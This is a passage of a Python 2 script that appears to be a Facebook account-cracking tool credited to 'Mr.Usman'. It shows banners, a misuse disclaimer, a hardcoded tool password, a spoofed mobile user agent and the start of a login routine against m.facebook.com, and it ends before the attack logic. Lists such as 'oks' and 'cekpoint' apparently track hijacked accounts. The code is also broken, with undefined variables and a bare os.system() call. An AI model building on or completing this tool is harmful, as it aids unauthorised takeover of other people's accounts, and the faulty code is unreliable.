#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
\033[1;98m   _____   __     ______     ______     ______    
\033[1;97m /\__  _\ /\ \   /\  ___\   /\  ___\   /\  == \   
\033[1;95m \/_/\ \/ \ \ \  \ \ \__ \  \ \  __\   \ \  __<   
\033[1;94m    \ \_\  \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
\033[1;93m     \/_/   \/_/   \/_____/   \/_____/   \/_/ /_/ 
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗           𝐌𝐫.𝐔𝐬𝐦𝐚𝐧           ║    
\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪     ǗŜϻĮ ČŘẸÃŤĮỖŇ     ║  
\033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊

\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR USMAN~
\033[1;97m************************************************

\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
\033[1;95m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
\033[1;95m____─█──███▄▄███▄▄███──█─ 
\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
"""
jalan("\033[1;92m              _    _     _ ")             
jalan("\033[1;92m             | |  (_)   | |")             
jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD✔ ") 
jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")
jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")
jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")
jalan("\033[1;92m | | ")                                   
jalan("\033[1;92m |_| ")



CorrectUsername = "usmi"
CorrectPassword = "usmi"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system()
    else:
        print "\033[1;96mWrong Username"
        os.system('')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[⚡] \x1b[1;91m───Login your new ID───\x1b[1;93m[⚡]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(n
